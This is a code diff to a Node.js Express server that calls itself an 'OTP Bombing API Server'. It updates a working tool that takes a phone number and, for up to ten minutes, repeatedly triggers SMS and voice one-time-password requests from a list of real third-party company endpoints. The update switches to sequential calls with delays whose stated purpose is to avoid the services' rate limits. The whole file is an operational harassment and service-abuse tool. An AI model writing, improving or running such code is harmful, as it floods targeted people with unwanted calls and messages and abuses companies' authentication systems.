@@ -1,6 +1,6 @@
 // ============================================================
-// api_server.js - OTP Bombing API Server (v8.0 SIMPLIFIED)
-// No MongoDB | Parallel | Cycle-based | 10min Highest Cap
+// api_server.js - OTP Bombing API Server (v9.0 SEQUENTIAL)
+// Sequential + Delay | No MongoDB | Parallel Sessions | 10min Cap
 // ============================================================
 
 const express = require('express');
@@ -19,33 +19,35 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // ===== CONFIGURATION =====
 // ============================================================
 
-const MAX_EFFECTIVE_DURATION = 10;    // 10 min highest cap
-const CYCLE_DELAY_MS = 100;           // Delay between cycles
-const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;  // 2 min
-const LOG_RETENTION_MS = 2 * 60 * 1000;          // 2 min
+const MAX_EFFECTIVE_DURATION = 10;      // 10 min highest cap
+const API_DELAY_MS = 200;                // 200ms delay between each API
+const CYCLE_DELAY_MS = 500;              // 500ms delay between cycles
+const PER_API_TIMEOUT = 8000;            // 8s timeout per API
+const LOG_CLEANUP_INTERVAL_MS = 2 * 60 * 1000;
+const LOG_RETENTION_MS = 2 * 60 * 1000;
 
 // ============================================================
-// ===== CUSTOM AGENTS (DNS Timeout) =====
+// ===== CUSTOM AGENTS =====
 // ============================================================
 
 const httpAgent = new http.Agent({
     keepAlive: true,
-    timeout: 4000,
-    maxSockets: 200,
-    maxFreeSockets: 20
+    timeout: 8000,
+    maxSockets: 50,
+    maxFreeSockets: 10
 });
 
 const httpsAgent = new https.Agent({
     keepAlive: true,
-    timeout: 4000,
-    maxSockets: 200,
-    maxFreeSockets: 20
+    timeout: 8000,
+    maxSockets: 50,
+    maxFreeSockets: 10
 });
 
 function lookupWithTimeout(hostname, options, callback) {
     const lookupTimeout = setTimeout(() => {
         callback(new Error('DNS_TIMEOUT'));
-    }, 2000);
+    }, 3000);
 
     dns.lookup(hostname, options, (err, address, family) => {
         clearTimeout(lookupTimeout);
@@ -54,7 +56,7 @@ function lookupWithTimeout(hostname, options, callback) {
 }
 
 // ============================================================
-// ===== LOG STORE (2 min cleanup) =====
+// ===== LOG STORE =====
 // ============================================================
 
 class LogStore {
@@ -98,10 +100,10 @@ function logWarn(msg, meta) { console.log(`⚠️  ${msg}`); logStore.add('warn'
 function logError(msg, meta) { console.error(`🔥 ${msg}`); logStore.add('error', msg, meta); }
 
 // ============================================================
-// ===== ACTIVE BOMBING SESSIONS =====
+// ===== ACTIVE SESSIONS =====
 // ============================================================
 
-const activeSessions = new Map();  // sessionId → { phone, endTime, cycleCount, ... }
+const activeSessions = new Map();
 let sessionCounter = 0;
 
 // ============================================================
@@ -109,7 +111,7 @@ let sessionCounter = 0;
 // ============================================================
 
 const APIS = [
-    // ===== VOICE APIs (Calls) =====
+    // ===== VOICE APIs =====
     {
         name: "Tata Capital Voice",
         url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
@@ -626,13 +628,13 @@ const APIS = [
     }
 ];
 
-logSuccess(`Loaded ${APIS.length} working APIs`);
+logSuccess(`Loaded ${APIS.length} working APIs (sequential mode)`);
 
 // ============================================================
 // ===== API CALL FUNCTION =====
 // ============================================================
 
-async function makeApiCall(api, phone, timeoutMs = 4000) {
+async function makeApiCall(api, phone, timeoutMs = PER_API_TIMEOUT) {
     const startTime = Date.now();
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
@@ -705,7 +707,8 @@ async function makeApiCall(api, phone, timeoutMs = 4000) {
         clearTimeout(timeoutId);
 
         const responseTime = Date.now() - startTime;
-        const success = response.status >= 200 && response.status < 500;
+        // 🔥 Sirf 200-299 ko success maano
+        const success = response.status >= 200 && response.status < 300;
         return { success, status: response.status, responseTime };
 
     } catch (err) {
@@ -720,7 +723,7 @@ async function makeApiCall(api, phone, timeoutMs = 4000) {
 }
 
 // ============================================================
-// ===== BOMBING LOOP (CYCLE-BASED) =====
+// ===== BOMBING SESSION (SEQUENTIAL) =====
 // ============================================================
 
 async function runBombingSession(sessionId, phone, durationMinutes) {
@@ -736,35 +739,37 @@ async function runBombingSession(sessionId, phone, durationMinutes) {
         session.cycleCount++;
         const cycleNum = session.cycleCount;
 
-        logInfo(`🔄 SESSION ${sessionId} | Cycle #${cycleNum} | API list call...`);
+        logInfo(`🔄 SESSION ${sessionId} | Cycle #${cycleNum} START | ${APIS.length} APIs sequential call...`);
 
-        // 🔥 POORI API LIST CALL KARO (parallel)
-        const results = await Promise.allSettled(
-            APIS.map(api => makeApiCall(api, phone, 4000))
-        );
+        // 🔥 SEQUENTIAL CALL — ek ke baad ek
+        for (let i = 0; i < APIS.length; i++) {
+            // Check session still active
+            if (!activeSessions.has(sessionId)) break;
 
-        // Log each API result
-        for (let i = 0; i < results.length; i++) {
             const api = APIS[i];
-            const result = results[i];
+            const result = await makeApiCall(api, phone, PER_API_TIMEOUT);
 
-            if (result.status === 'fulfilled' && result.value) {
-                const val = result.value;
-                if (val.success) {
-                    session.successCount++;
-                    logSuccess(`[${sessionId}] Cycle #${cycleNum} | ${api.name} → ${val.status} (${val.responseTime}ms)`);
-                } else {
-                    session.failCount++;
-                    logFail(`[${sessionId}] Cycle #${cycleNum} | ${api.name} → FAIL (${val.responseTime}ms)`);
-                }
+            if (result.success) {
+                session.successCount++;
+                logSuccess(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${APIS.length}] ${api.name} → ${result.status} (${result.responseTime}ms)`);
+            } else {
+                session.failCount++;
+                const statusText = result.status ? ` → ${result.status}` : ' → FAIL';
+                logFail(`[${sessionId}] Cycle #${cycleNum} | [${i + 1}/${APIS.length}] ${api.name}${statusText} (${result.responseTime}ms)`);
+            }
+
+            // 🔥 DELAY between APIs (rate limit avoid)
+            if (i < APIS.length - 1) {
+                await new Promise(r => setTimeout(r, API_DELAY_MS));
             }
         }
 
-        // Check if session still active
-        if (!activeSessions.has(sessionId)) break;
+        logInfo(`✅ SESSION ${sessionId} | Cycle #${cycleNum} COMPLETE | Success: ${session.successCount} | Fail: ${session.failCount}`);
 
-        // 🔥 CYCLE DELAY (thoda wait phir next cycle)
-        await new Promise(r => setTimeout(r, CYCLE_DELAY_MS));
+        // 🔥 Cycle delay (next cycle se pehle thoda wait)
+        if (Date.now() < endTime && activeSessions.has(sessionId)) {
+            await new Promise(r => setTimeout(r, CYCLE_DELAY_MS));
+        }
     }
 
     // Session complete
@@ -783,6 +788,8 @@ app.get('/', (req, res) => {
         instance: process.env.INSTANCE_NAME || 'api',
         total_apis: APIS.length,
         active_sessions: activeSessions.size,
+        mode: 'sequential',
+        api_delay_ms: API_DELAY_MS,
         uptime: process.uptime()
     });
 });
@@ -792,6 +799,7 @@ app.get('/health', (req, res) => {
         ready: true,
         total_apis: APIS.length,
         active_sessions: activeSessions.size,
+        mode: 'sequential',
         uptime: process.uptime()
     });
 });
@@ -806,7 +814,6 @@ app.post('/bomb', async (req, res) => {
     // 🔥 10 MIN HIGHEST CAP
     const effectiveDuration = Math.min(Number(duration) || 1, MAX_EFFECTIVE_DURATION);
 
-    // 🔥 NEW SESSION CREATE
     sessionCounter++;
     const sessionId = `S${sessionCounter}_${phone}`;
 
@@ -821,22 +828,22 @@ app.post('/bomb', async (req, res) => {
         instance: instance || 'default'
     });
 
-    logInfo(`📱 NEW SESSION ${sessionId} | Phone: ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'} | Active Sessions: ${activeSessions.size}`);
+    logInfo(`📱 NEW SESSION ${sessionId} | Phone: ${phone} | Requested: ${duration}min | Effective: ${effectiveDuration}min | Active: ${activeSessions.size}`);
 
-    // 🔥 BACKGROUND ME CHALAO (response turant return)
+    // 🔥 Background me chalao
     runBombingSession(sessionId, phone, effectiveDuration).catch(err => {
         logError(`SESSION ${sessionId} ERROR: ${err.message}`);
         activeSessions.delete(sessionId);
     });
 
-    // Turant response
     res.json({
         success: true,
         session_id: sessionId,
         phone,
         duration: effectiveDuration,
         total_apis: APIS.length,
-        message: 'Bombing started. Check /logs for status.'
+        mode: 'sequential',
+        message: 'Sequential bombing started. Check /logs for status.'
     });
 });
 
@@ -879,7 +886,7 @@ app.post('/stop/:sessionId', (req, res) => {
     const { sessionId } = req.params;
     if (activeSessions.has(sessionId)) {
         activeSessions.delete(sessionId);
-        logWarn(`🛑 SESSION ${sessionId} STOPPED by request`);
+        logWarn(`🛑 SESSION ${sessionId} STOPPED`);
         res.json({ success: true, message: 'Session stopped' });
     } else {
         res.json({ success: false, message: 'Session not found' });
@@ -889,6 +896,9 @@ app.post('/stop/:sessionId', (req, res) => {
 app.get('/apis', (req, res) => {
     res.json({
         total: APIS.length,
+        mode: 'sequential',
+        api_delay_ms: API_DELAY_MS,
+        cycle_delay_ms: CYCLE_DELAY_MS,
         apis: APIS.map(a => a.name)
     });
 });
@@ -902,11 +912,12 @@ app.listen(PORT, '0.0.0.0', () => {
     logSuccess(`API Server running on port ${PORT}`);
     logInfo(`Instance: ${process.env.INSTANCE_NAME || 'default'}`);
     logInfo(`APIs loaded: ${APIS.length}`);
-    logInfo(`Max duration: ${MAX_EFFECTIVE_DURATION} min (highest cap)`);
-    logInfo(`Cycle-based bombing: ENABLED`);
+    logInfo(`Mode: SEQUENTIAL (one API at a time)`);
+    logInfo(`API delay: ${API_DELAY_MS}ms between each API`);
+    logInfo(`Cycle delay: ${CYCLE_DELAY_MS}ms between cycles`);
+    logInfo(`Per-API timeout: ${PER_API_TIMEOUT}ms`);
+    logInfo(`Max duration: ${MAX_EFFECTIVE_DURATION} min`);
     logInfo(`Parallel sessions: ENABLED`);
-    logInfo(`Log retention: 2 minutes`);
-    logInfo(`No MongoDB: SIMPLIFIED`);
 
     logStore.startCleanup();
 });
